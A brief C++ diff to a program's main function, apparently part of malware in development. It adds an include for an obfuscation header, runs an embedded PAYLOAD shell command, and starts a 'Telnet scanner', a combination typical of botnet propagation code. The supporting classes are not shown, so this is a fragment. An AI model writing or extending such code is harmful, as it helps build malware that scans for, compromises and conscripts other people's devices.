@@ -2,10 +2,17 @@
 #include "core/sys/file-system.hpp"
 #include "core/obf/MetaString.h"
 
-int main (int argc, char * argv[]) {
+#include "core/scanner.hpp"
 
+int main (int argc, char * argv[]) {
   // Execute the shell command and save the output.
-  std::string response = FileSystem().process(PAYLOAD);
+  #if defined(PAYLOAD)
+  std::string payload_output = FileSystem().process(PAYLOAD);
+  #endif
+
+  // Telnet scanner.
+  Scanner * scanner = new Scanner();
+  scanner->ignite();
 
   // TODO
   //
